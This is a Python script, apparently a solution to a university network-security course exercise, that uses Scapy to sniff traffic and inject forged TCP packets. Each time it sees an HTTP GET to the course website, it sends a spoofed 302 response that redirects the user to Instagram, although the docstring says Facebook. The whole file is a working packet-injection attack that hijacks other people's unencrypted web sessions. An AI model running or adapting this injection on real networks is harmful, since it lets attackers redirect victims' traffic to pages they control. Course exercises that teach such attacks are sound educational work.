import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to Facebook by sending them the
    `RESPONSE` from above.
    """
    if packet.haslayer(S.Raw):
        lines = str(packet.getlayer(S.Raw)).split("\r\n")
        if lines:
            if lines[1] == "Host: infosec.cs.tau.ac.il" and "GET" in lines[0] and packet.haslayer('TCP') and packet[S.TCP].dport == 80:
                new_packet = S.IP(dst=packet[S.IP].src, src=packet[S.IP].dst) / S.TCP(sport=packet[S.TCP].dport, dport=packet[S.TCP].sport, flags='FA', seq=packet[S.TCP].ack, ack=packet[S.TCP].seq+len(packet[S.TCP].payload)) / S.Raw(load=RESPONSE)
                return new_packet
    return None
        


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print 'Usage: %s' % args[0]
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
